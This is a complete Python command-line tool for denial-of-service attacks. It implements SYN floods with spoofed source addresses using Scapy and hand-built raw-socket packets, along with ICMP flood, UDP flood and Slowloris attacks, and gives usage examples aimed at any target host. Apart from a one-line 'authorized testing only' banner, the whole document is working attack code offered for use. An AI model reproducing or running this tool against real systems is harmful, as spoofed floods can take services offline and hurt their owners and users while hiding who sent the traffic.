#!/usr/bin/env python3
"""
SYN Flood / DoS Attack Scripts
A comprehensive suite for performing SYN flood attacks and DoS testing
in controlled environments. Includes multiple attack variations, 
traffic generation, and monitoring capabilities.
"""

import argparse
import sys
import os
import time
import threading
import logging
import random
import socket
import struct
from datetime import datetime
from typing import List, Dict, Optional, Tuple, Union
from collections import defaultdict
import signal
import ipaddress

# Try importing scapy with fallback message
try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, ICMP
    from scapy.layers.l2 import Ether
    from scapy.sendrecv import send, sr1, srloop
    from scapy.error import Scapy_Exception
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Try importing raw socket libraries for high-performance mode
try:
    import socket
    SOCKET_AVAILABLE = True
except ImportError:
    SOCKET_AVAILABLE = False

# Optional imports for enhanced functionality
try:
    from colorama import init, Fore, Style
    COLORAMA_AVAILABLE = True
    init()  # Initialize colorama for Windows support
except ImportError:
    COLORAMA_AVAILABLE = False

try:
    import netifaces
    NETIFACES_AVAILABLE = True
except ImportError:
    NETIFACES_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False


class TCPFlags:
    """TCP flag constants"""
    FIN = 0x01
    SYN = 0x02
    RST = 0x04
    PSH = 0x08
    ACK = 0x10
    URG = 0x20
    ECE = 0x40
    CWR = 0x80


class SYNFloodAttack:
    """
    Main class for SYN flood attacks
    Implements multiple flooding techniques with performance optimizations
    """
    
    def __init__(self, target_ip: str, target_port: int = 80,
                 interface: str = None, spoof_ip: bool = True,
                 src_ip_range: str = None, src_port_range: Tuple[int, int] = (1024, 65535),
                 rate: int = 1000, duration: int = 0, packets: int = 0,
                 verbose: bool = False, method: str = 'scapy',
                 window_size: int = 1024, ttl: int = 64):
        """
        Initialize SYN flood attack
        
        Args:
            target_ip: Target IP address
            target_port: Target port (default: 80)
            interface: Network interface to use
            spoof_ip: Spoof source IP addresses
            src_ip_range: Source IP range (CIDR or range)
            src_port_range: Source port range (min, max)
            rate: Packets per second
            duration: Attack duration in seconds (0 = unlimited)
            packets: Number of packets to send (0 = unlimited)
            verbose: Enable verbose output
            method: Attack method ('scapy', 'raw', 'mixed')
            window_size: TCP window size
            ttl: IP TTL value
        """
        if not SCAPY_AVAILABLE and method == 'scapy':
            raise ImportError(
                "scapy module is required for scapy method. Install with: pip install scapy"
            )
        
        self.target_ip = target_ip
        self.target_port = target_port
        self.interface = interface or self.get_default_interface()
        self.spoof_ip = spoof_ip
        self.src_ip_range = src_ip_range
        self.src_port_range = src_port_range
        self.rate = rate
        self.duration = duration
        self.packets = packets
        self.verbose = verbose
        self.method = method
        self.window_size = window_size
        self.ttl = ttl
        
        # Source IP pool
        self.src_ips = self.generate_source_ips()
        
        # Statistics
        self.stats = {
            'packets_sent': 0,
            'packets_failed': 0,
            'bytes_sent': 0,
            'start_time': None,
            'end_time': None,
            'syn_acks_received': 0,
            'rsts_received': 0
        }
        
        self.lock = threading.Lock()
        self.running = False
        self.attack_threads = []
        
        # Setup logging
        self.setup_logging()
        
        # Validate target
        self.validate_target()
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Initialize raw socket if needed
        if method in ['raw', 'mixed']:
            self.init_raw_socket()
    
    def setup_logging(self):
        """Configure logging with optional colors"""
        self.logger = logging.getLogger('SYNFlood')
        
        # Remove existing handlers
        self.logger.handlers.clear()
        
        # Create console handler
        handler = logging.StreamHandler()
        
        # Set format based on colorama availability
        if COLORAMA_AVAILABLE:
            formatter = logging.Formatter(
                f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - '
                f'{Fore.YELLOW}%(levelname)s{Style.RESET_ALL} - %(message)s',
                datefmt='%H:%M:%S'
            )
        else:
            formatter = logging.Formatter(
                '%(asctime)s - %(levelname)s - %(message)s',
                datefmt='%H:%M:%S'
            )
        
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        
        # Set log level
        self.logger.setLevel(logging.DEBUG if self.verbose else logging.INFO)
    
    def get_default_interface(self) -> str:
        """Get default network interface"""
        if NETIFACES_AVAILABLE:
            try:
                gateway = netifaces.gateways()['default'][netifaces.AF_INET]
                return gateway[1]
            except:
                pass
        
        # Fallback to scapy
        try:
            return conf.iface
        except:
            return 'eth0'
    
    def validate_target(self):
        """Validate target is reachable"""
        try:
            # Try to resolve hostname
            self.target_ip = socket.gethostbyname(self.target_ip)
            
            # Quick connectivity test
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((self.target_ip, self.target_port))
            sock.close()
            
            if result == 0:
                self.logger.info(f"[+] Target {self.target_ip}:{self.target_port} is reachable")
            else:
                self.logger.warning(f"[!] Target {self.target_ip}:{self.target_port} may be unreachable")
                
        except socket.gaierror:
            self.logger.error(f"[-] Could not resolve hostname: {self.target_ip}")
            sys.exit(1)
        except Exception as e:
            self.logger.error(f"[-] Target validation failed: {e}")
    
    def generate_source_ips(self) -> List[str]:
        """
        Generate source IP addresses for spoofing
        
        Returns:
            List of source IPs
        """
        ips = []
        
        if not self.spoof_ip:
            # Use real IP
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                real_ip = s.getsockname()[0]
                s.close()
                ips = [real_ip]
            except:
                ips = ['127.0.0.1']
        elif self.src_ip_range:
            # Generate IPs from range
            try:
                if '/' in self.src_ip_range:  # CIDR notation
                    network = ipaddress.IPv4Network(self.src_ip_range, strict=False)
                    ips = [str(ip) for ip in network.hosts()]
                elif '-' in self.src_ip_range:  # Range notation
                    start, end = self.src_ip_range.split('-')
                    start_ip = ipaddress.IPv4Address(start.strip())
                    end_ip = ipaddress.IPv4Address(end.strip())
                    ips = [str(ipaddress.IPv4Address(ip)) 
                          for ip in range(int(start_ip), int(end_ip) + 1)]
                else:  # Single IP
                    ips = [self.src_ip_range]
            except Exception as e:
                self.logger.error(f"[-] Invalid IP range: {e}")
                ips = ['192.168.1.' + str(random.randint(1, 254)) for _ in range(100)]
        else:
            # Generate random private IPs
            ips = [f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                  for _ in range(1000)]
        
        self.logger.info(f"[*] Generated {len(ips)} source IPs")
        return ips
    
    def generate_syn_packet_scapy(self, src_ip: str, src_port: int) -> Packet:
        """
        Generate SYN packet using Scapy
        
        Args:
            src_ip: Source IP
            src_port: Source port
        
        Returns:
            Scapy packet
        """
        ip = IP(src=src_ip, dst=self.target_ip, ttl=self.ttl)
        tcp = TCP(
            sport=src_port,
            dport=self.target_port,
            flags='S',
            seq=random.randint(0, 4294967295),
            window=self.window_size,
            options=[('MSS', 1460), ('SAckOK', b''), ('Timestamp', (int(time.time()), 0))]
        )
        
        return ip/tcp
    
    def init_raw_socket(self):
        """Initialize raw socket for high-performance packet injection"""
        try:
            self.raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            self.raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            self.logger.info("[+] Raw socket initialized")
        except Exception as e:
            self.logger.error(f"[-] Failed to initialize raw socket: {e}")
            self.raw_socket = None
    
    def create_ip_header(self, src_ip: str, dst_ip: str) -> bytes:
        """
        Create IP header for raw packet
        
        Args:
            src_ip: Source IP
            dst_ip: Destination IP
        
        Returns:
            IP header bytes
        """
        # IP header fields
        version_ihl = (4 << 4) | 5  # Version 4, IHL 5
        tos = 0
        total_length = 40  # IP header (20) + TCP header (20)
        ip_id = random.randint(0, 65535)
        ip_flags_frag = 0
        ttl = self.ttl
        protocol = socket.IPPROTO_TCP
        checksum = 0  # Will be filled by kernel if IP_HDRINCL is set
        
        src_ip_bytes = socket.inet_aton(src_ip)
        dst_ip_bytes = socket.inet_aton(dst_ip)
        
        # Pack IP header
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               version_ihl, tos, total_length,
                               ip_id, ip_flags_frag, ttl, protocol,
                               checksum, src_ip_bytes, dst_ip_bytes)
        
        return ip_header
    
    def create_tcp_header(self, src_port: int, dst_port: int, seq_num: int) -> bytes:
        """
        Create TCP header for raw packet
        
        Args:
            src_port: Source port
            dst_port: Destination port
            seq_num: Sequence number
        
        Returns:
            TCP header bytes
        """
        # TCP header fields
        ack_num = 0
        data_offset = 5  # 5 * 4 = 20 bytes
        flags = TCPFlags.SYN
        window = self.window_size
        checksum = 0
        urgent_ptr = 0
        
        # TCP options (MSS)
        options = struct.pack('!BBH', 2, 4, 1460)  # MSS option
        tcp_header = struct.pack('!HHLLBBHHH',
                                src_port, dst_port,
                                seq_num, ack_num,
                                (data_offset << 4), flags,
                                window, checksum, urgent_ptr)
        
        return tcp_header + options
    
    def calculate_tcp_checksum(self, ip_header: bytes, tcp_header: bytes, tcp_data: bytes = b'') -> int:
        """
        Calculate TCP checksum
        
        Args:
            ip_header: IP header bytes
            tcp_header: TCP header bytes
            tcp_data: TCP payload data
        
        Returns:
            Checksum value
        """
        # Create pseudo header
        src_ip = ip_header[12:16]
        dst_ip = ip_header[16:20]
        protocol = ip_header[9]
        tcp_length = len(tcp_header) + len(tcp_data)
        
        pseudo_header = struct.pack('!4s4sBBH',
                                   src_ip, dst_ip,
                                   0, protocol, tcp_length)
        
        # Calculate checksum
        checksum_data = pseudo_header + tcp_header + tcp_data
        
        # Pad to even length
        if len(checksum_data) % 2:
            checksum_data += b'\x00'
        
        total = 0
        for i in range(0, len(checksum_data), 2):
            word = (checksum_data[i] << 8) + checksum_data[i + 1]
            total += word
            total = (total & 0xFFFF) + (total >> 16)
        
        return ~total & 0xFFFF
    
    def send_packet_raw(self, src_ip: str, src_port: int) -> bool:
        """
        Send SYN packet using raw socket
        
        Args:
            src_ip: Source IP
            src_port: Source port
        
        Returns:
            Success boolean
        """
        if not self.raw_socket:
            return False
        
        try:
            # Create headers
            ip_header = self.create_ip_header(src_ip, self.target_ip)
            seq_num = random.randint(0, 4294967295)
            tcp_header = self.create_tcp_header(src_port, self.target_port, seq_num)
            
            # Calculate TCP checksum
            tcp_checksum = self.calculate_tcp_checksum(ip_header, tcp_header)
            
            # Update TCP header with checksum
            tcp_header_with_checksum = tcp_header[:16] + struct.pack('!H', tcp_checksum) + tcp_header[18:]
            
            # Send packet
            packet = ip_header + tcp_header_with_checksum
            self.raw_socket.sendto(packet, (self.target_ip, 0))
            
            return True
            
        except Exception as e:
            if self.verbose:
                self.logger.debug(f"Raw send error: {e}")
            return False
    
    def response_listener(self):
        """Listen for SYN-ACK and RST responses"""
        try:
            # Create socket to listen for responses
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.settimeout(1)
            
            while self.running:
                try:
                    packet, addr = sock.recvfrom(65535)
                    
                    # Parse TCP header (skip IP header)
                    ip_header = packet[0:20]
                    ip_header_len = (ip_header[0] & 0x0F) * 4
                    tcp_header = packet[ip_header_len:ip_header_len+20]
                    
                    # Extract flags
                    flags = tcp_header[13]
                    
                    # Check if from target
                    if addr[0] == self.target_ip:
                        if flags & TCPFlags.SYN and flags & TCPFlags.ACK:
                            with self.lock:
                                self.stats['syn_acks_received'] += 1
                            if self.verbose:
                                self.logger.debug(f"[*] SYN-ACK received from {addr[0]}")
                        elif flags & TCPFlags.RST:
                            with self.lock:
                                self.stats['rsts_received'] += 1
                            if self.verbose:
                                self.logger.debug(f"[*] RST received from {addr[0]}")
                                
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.verbose:
                        self.logger.debug(f"Response listener error: {e}")
                        
        except Exception as e:
            self.logger.error(f"[-] Response listener failed: {e}")
    
    def attack_worker_scapy(self, worker_id: int, packet_interval: float):
        """
        Attack worker using Scapy
        
        Args:
            worker_id: Worker thread ID
            packet_interval: Time between packets
        """
        self.logger.info(f"[*] Worker {worker_id} started")
        
        while self.running:
            try:
                # Select source IP and port
                src_ip = random.choice(self.src_ips) if self.spoof_ip else self.src_ips[0]
                src_port = random.randint(self.src_port_range[0], self.src_port_range[1])
                
                # Create and send packet
                packet = self.generate_syn_packet_scapy(src_ip, src_port)
                send(packet, iface=self.interface, verbose=0)
                
                with self.lock:
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += len(packet)
                
                # Rate limiting
                if packet_interval > 0:
                    time.sleep(packet_interval)
                
                # Check if we've reached packet limit
                if self.packets > 0 and self.stats['packets_sent'] >= self.packets:
                    self.running = False
                    break
                    
            except Exception as e:
                with self.lock:
                    self.stats['packets_failed'] += 1
                if self.verbose:
                    self.logger.debug(f"Worker {worker_id} error: {e}")
        
        self.logger.info(f"[*] Worker {worker_id} finished")
    
    def attack_worker_raw(self, worker_id: int, packet_interval: float):
        """
        Attack worker using raw sockets
        
        Args:
            worker_id: Worker thread ID
            packet_interval: Time between packets
        """
        self.logger.info(f"[*] Raw worker {worker_id} started")
        
        while self.running:
            try:
                # Select source IP and port
                src_ip = random.choice(self.src_ips) if self.spoof_ip else self.src_ips[0]
                src_port = random.randint(self.src_port_range[0], self.src_port_range[1])
                
                # Send raw packet
                success = self.send_packet_raw(src_ip, src_port)
                
                with self.lock:
                    if success:
                        self.stats['packets_sent'] += 1
                        self.stats['bytes_sent'] += 40  # IP + TCP header size
                    else:
                        self.stats['packets_failed'] += 1
                
                # Rate limiting
                if packet_interval > 0:
                    time.sleep(packet_interval)
                
                # Check if we've reached packet limit
                if self.packets > 0 and self.stats['packets_sent'] >= self.packets:
                    self.running = False
                    break
                    
            except Exception as e:
                with self.lock:
                    self.stats['packets_failed'] += 1
                if self.verbose:
                    self.logger.debug(f"Raw worker {worker_id} error: {e}")
        
        self.logger.info(f"[*] Raw worker {worker_id} finished")
    
    def monitor_bandwidth(self):
        """Monitor and display bandwidth usage"""
        if not PSUTIL_AVAILABLE:
            return
        
        last_packets = 0
        last_bytes = 0
        last_time = time.time()
        
        while self.running:
            time.sleep(1)
            current_time = time.time()
            
            with self.lock:
                current_packets = self.stats['packets_sent']
                current_bytes = self.stats['bytes_sent']
            
            if current_time - last_time > 0:
                packets_per_sec = (current_packets - last_packets) / (current_time - last_time)
                bytes_per_sec = (current_bytes - last_bytes) / (current_time - last_time)
                
                mbps = (bytes_per_sec * 8) / 1_000_000
                
                self.logger.info(
                    f"[*] Rate: {packets_per_sec:.0f} pps | "
                    f"{mbps:.2f} Mbps | "
                    f"Total: {current_packets:,} packets | "
                    f"SYN-ACKs: {self.stats['syn_acks_received']}"
                )
            
            last_packets = current_packets
            last_bytes = current_bytes
            last_time = current_time
    
    def start_attack(self):
        """Start the SYN flood attack"""
        self.running = True
        self.stats['start_time'] = time.time()
        
        # Determine number of workers based on rate
        if self.rate <= 1000:
            num_workers = 1
        elif self.rate <= 10000:
            num_workers = 4
        else:
            num_workers = 8
        
        packet_interval = 1.0 / (self.rate / num_workers)
        
        self.logger.info(f"\n{'='*60}")
        self.logger.info(f"SYN Flood Attack Started")
        self.logger.info(f"{'='*60}")
        self.logger.info(f"Target: {self.target_ip}:{self.target_port}")
        self.logger.info(f"Interface: {self.interface}")
        self.logger.info(f"Method: {self.method}")
        self.logger.info(f"Rate: {self.rate} packets/sec")
        self.logger.info(f"Workers: {num_workers}")
        self.logger.info(f"Spoof IP: {self.spoof_ip}")
        self.logger.info(f"Source IPs: {len(self.src_ips)}")
        self.logger.info(f"{'='*60}\n")
        
        # Start response listener
        if self.verbose:
            listener_thread = threading.Thread(target=self.response_listener)
            listener_thread.daemon = True
            listener_thread.start()
        
        # Start bandwidth monitor
        if PSUTIL_AVAILABLE:
            monitor_thread = threading.Thread(target=self.monitor_bandwidth)
            monitor_thread.daemon = True
            monitor_thread.start()
        
        # Start attack workers
        worker_func = self.attack_worker_raw if self.method == 'raw' else self.attack_worker_scapy
        
        for i in range(num_workers):
            t = threading.Thread(target=worker_func, args=(i+1, packet_interval))
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
        
        # Run for specified duration
        if self.duration > 0:
            self.logger.info(f"[*] Attack will run for {self.duration} seconds")
            time.sleep(self.duration)
            self.stop_attack()
        elif self.packets > 0:
            self.logger.info(f"[*] Attack will send {self.packets} packets")
            # Wait for completion
            for t in self.attack_threads:
                t.join()
            self.stop_attack()
        else:
            # Wait for interrupt
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.stop_attack()
    
    def stop_attack(self):
        """Stop the SYN flood attack"""
        self.logger.info("\n[*] Stopping attack...")
        self.running = False
        
        # Wait for threads to finish
        for t in self.attack_threads:
            t.join(timeout=2)
        
        self.stats['end_time'] = time.time()
        
        # Cleanup raw socket
        if hasattr(self, 'raw_socket') and self.raw_socket:
            self.raw_socket.close()
        
        # Display statistics
        self.show_statistics()
    
    def show_statistics(self):
        """Display attack statistics"""
        elapsed = self.stats['end_time'] - self.stats['start_time'] if self.stats['end_time'] else 0
        
        print(f"\n{'='*60}")
        print(f"Attack Statistics")
        print(f"{'='*60}")
        print(f"Duration: {elapsed:.2f} seconds")
        print(f"Packets sent: {self.stats['packets_sent']:,}")
        print(f"Packets failed: {self.stats['packets_failed']:,}")
        print(f"Bytes sent: {self.stats['bytes_sent']:,} ({self.stats['bytes_sent']/1_000_000:.2f} MB)")
        
        if elapsed > 0:
            print(f"Average rate: {self.stats['packets_sent']/elapsed:.0f} pps")
            print(f"Average bandwidth: {(self.stats['bytes_sent']*8/elapsed)/1_000_000:.2f} Mbps")
        
        print(f"SYN-ACKs received: {self.stats['syn_acks_received']}")
        print(f"RSTs received: {self.stats['rsts_received']}")
        print(f"{'='*60}\n")
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        self.logger.info("\n[!] Interrupt received, stopping attack...")
        self.stop_attack()
        sys.exit(0)


class DOSSimulator:
    """
    Advanced DoS simulation with multiple attack vectors
    """
    
    def __init__(self, target_ip: str, target_ports: List[int] = None):
        self.target_ip = target_ip
        self.target_ports = target_ports or [80, 443, 22, 21, 25]
        self.results = {}
    
    def icmp_flood(self, duration: int = 10, rate: int = 100) -> Dict:
        """
        ICMP (Ping) flood attack
        
        Args:
            duration: Attack duration
            rate: Packets per second
        
        Returns:
            Statistics dictionary
        """
        self.logger.info(f"[*] Starting ICMP flood on {self.target_ip}")
        
        stats = {'packets_sent': 0, 'packets_failed': 0}
        start_time = time.time()
        
        packet = IP(dst=self.target_ip)/ICMP()/"X"*56
        
        while time.time() - start_time < duration:
            try:
                send(packet, verbose=0)
                stats['packets_sent'] += 1
                time.sleep(1.0/rate)
            except:
                stats['packets_failed'] += 1
        
        return stats
    
    def udp_flood(self, duration: int = 10, rate: int = 100) -> Dict:
        """
        UDP flood attack
        
        Args:
            duration: Attack duration
            rate: Packets per second
        
        Returns:
            Statistics dictionary
        """
        self.logger.info(f"[*] Starting UDP flood on {self.target_ip}")
        
        stats = {'packets_sent': 0, 'packets_failed': 0}
        start_time = time.time()
        
        while time.time() - start_time < duration:
            try:
                for port in self.target_ports:
                    packet = IP(dst=self.target_ip)/UDP(sport=random.randint(1024,65535), dport=port)/"X"*1024
                    send(packet, verbose=0)
                    stats['packets_sent'] += 1
                    time.sleep(1.0/(rate * len(self.target_ports)))
            except:
                stats['packets_failed'] += 1
        
        return stats
    
    def slowloris(self, duration: int = 60, sockets: int = 200) -> Dict:
        """
        Slowloris HTTP DoS attack
        
        Args:
            duration: Attack duration
            sockets: Number of sockets to maintain
        
        Returns:
            Statistics dictionary
        """
        self.logger.info(f"[*] Starting Slowloris attack on {self.target_ip}:80")
        
        stats = {'connections': 0, 'bytes_sent': 0}
        sockets_list = []
        
        # Create socket connections
        for _ in range(sockets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target_ip, 80))
                
                # Send partial HTTP request
                s.send(f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n".encode())
                sockets_list.append(s)
                stats['connections'] += 1
            except:
                pass
        
        # Maintain connections with periodic headers
        start_time = time.time()
        while time.time() - start_time < duration:
            for s in sockets_list[:]:
                try:
                    # Send keep-alive header
                    s.send("X-a: b\r\n".encode())
                    stats['bytes_sent'] += 8
                except:
                    sockets_list.remove(s)
                    stats['connections'] -= 1
            
            time.sleep(10)
        
        # Cleanup
        for s in sockets_list:
            s.close()
        
        return stats
    
    def run_all(self, duration_per_test: int = 10):
        """
        Run all DoS tests
        
        Args:
            duration_per_test: Duration for each test
        """
        self.logger.info(f"\n{'='*60}")
        self.logger.info(f"Comprehensive DoS Test Suite")
        self.logger.info(f"{'='*60}")
        
        # Run tests
        self.results['icmp'] = self.icmp_flood(duration_per_test)
        time.sleep(2)
        
        self.results['udp'] = self.udp_flood(duration_per_test)
        time.sleep(2)
        
        self.results['slowloris'] = self.slowloris(duration_per_test)
        
        # Display results
        self.show_results()
    
    def show_results(self):
        """Display test results"""
        print(f"\n{'='*60}")
        print(f"DoS Test Results")
        print(f"{'='*60}")
        
        for test, stats in self.results.items():
            print(f"\n{test.upper()} Attack:")
            for key, value in stats.items():
                print(f"  {key}: {value}")


def banner():
    """Display tool banner"""
    banner_text = f"""
{'='*60}
    SYN Flood / DoS Attack Scripts
    For authorized security testing and education only
    WARNING: These tools can disrupt network services
{'='*60}
    """
    if COLORAMA_AVAILABLE:
        print(f"{Fore.RED}{banner_text}{Style.RESET_ALL}")
    else:
        print(banner_text)


def main():
    """Main function for command-line interface"""
    parser = argparse.ArgumentParser(
        description='SYN Flood / DoS Attack Scripts - Test network resilience',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic SYN flood (1000 pps, 60 seconds)
  python syn_flood.py --target 192.168.1.100 --port 80 --rate 1000 --duration 60
  
  # High-performance raw socket attack
  python syn_flood.py --target 192.168.1.100 --port 443 --rate 10000 --method raw
  
  # Spoofed IP attack with custom range
  python syn_flood.py --target 192.168.1.100 --port 80 --spoof-ip --src-ip-range 10.0.0.0/24
  
  # Limited packet count
  python syn_flood.py --target 192.168.1.100 --port 80 --packets 10000
  
  # Comprehensive DoS test suite
  python syn_flood.py --target 192.168.1.100 --test-suite --duration 20
  
  # UDP flood test
  python syn_flood.py --target 192.168.1.100 --udp-test
  
  # Slowloris attack
  python syn_flood.py --target 192.168.1.100 --slowloris --duration 120
        """
    )
    
    # Main target arguments
    parser.add_argument('--target', '-t', help='Target IP address or hostname')
    parser.add_argument('--port', '-p', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--interface', '-i', help='Network interface to use')
    
    # Attack selection
    attack_group = parser.add_mutually_exclusive_group()
    attack_group.add_argument('--syn-flood', action='store_true', help='Perform SYN flood attack')
    attack_group.add_argument('--test-suite', action='store_true', help='Run comprehensive DoS test suite')
    attack_group.add_argument('--udp-test', action='store_true', help='Run UDP flood test')
    attack_group.add_argument('--icmp-test', action='store_true', help='Run ICMP flood test')
    attack_group.add_argument('--slowloris', action='store_true', help='Run Slowloris attack')
    
    # Attack parameters
    parser.add_argument('--rate', type=int, default=1000, help='Packets per second (default: 1000)')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds (default: 60)')
    parser.add_argument('--packets', type=int, default=0, help='Number of packets to send (0 = unlimited)')
    
    # Spoofing options
    parser.add_argument('--spoof-ip', action='store_true', help='Spoof source IP addresses')
    parser.add_argument('--src-ip-range', help='Source IP range (CIDR or start-end)')
    parser.add_argument('--src-port-min', type=int, default=1024, help='Min source port (default: 1024)')
    parser.add_argument('--src-port-max', type=int, default=65535, help='Max source port (default: 65535)')
    
    # Performance options
    parser.add_argument('--method', choices=['scapy', 'raw', 'mixed'], default='scapy',
                       help='Attack method (default: scapy)')
    parser.add_argument('--window', type=int, default=1024, help='TCP window size (default: 1024)')
    parser.add_argument('--ttl', type=int, default=64, help='IP TTL (default: 64)')
    
    # Output options
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--output', '-o', help='Output file for results')
    
    args = parser.parse_args()
    
    # Display banner
    banner()
    
    # Check if scapy is available
    if not SCAPY_AVAILABLE and args.method == 'scapy':
        print("[!] scapy module is required. Install with: pip install scapy")
        print("    On Debian/Ubuntu: sudo apt install python3-scapy")
        sys.exit(1)
    
    try:
        # If no specific attack selected, default to SYN flood
        if not any([args.syn_flood, args.test_suite, args.udp_test, 
                   args.icmp_test, args.slowloris]):
            args.syn_flood = True
        
        # Validate target for network attacks
        if args.syn_flood or args.udp_test or args.icmp_test:
            if not args.target:
                print("[-] Target required for network attacks")
                sys.exit(1)
        
        # Perform selected attack
        if args.syn_flood:
            # SYN flood attack
            attack = SYNFloodAttack(
                target_ip=args.target,
                target_port=args.port,
                interface=args.interface,
                spoof_ip=args.spoof_ip,
                src_ip_range=args.src_ip_range,
                src_port_range=(args.src_port_min, args.src_port_max),
                rate=args.rate,
                duration=args.duration,
                packets=args.packets,
                verbose=args.verbose,
                method=args.method,
                window_size=args.window,
                ttl=args.ttl
            )
            attack.start_attack()
        
        elif args.test_suite:
            # Comprehensive DoS test suite
            simulator = DOSSimulator(args.target)
            simulator.logger = logging.getLogger('DOSSimulator')
            simulator.run_all(args.duration)
        
        elif args.udp_test:
            # UDP flood test
            simulator = DOSSimulator(args.target)
            simulator.logger = logging.getLogger('DOSSimulator')
            results = simulator.udp_flood(args.duration, args.rate)
            print(f"\nUDP Flood Results: {results}")
        
        elif args.icmp_test:
            # ICMP flood test
            simulator = DOSSimulator(args.target)
            simulator.logger = logging.getLogger('DOSSimulator')
            results = simulator.icmp_flood(args.duration, args.rate)
            print(f"\nICMP Flood Results: {results}")
        
        elif args.slowloris:
            # Slowloris attack
            simulator = DOSSimulator(args.target)
            simulator.logger = logging.getLogger('DOSSimulator')
            results = simulator.slowloris(args.duration)
            print(f"\nSlowloris Results: {results}")
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
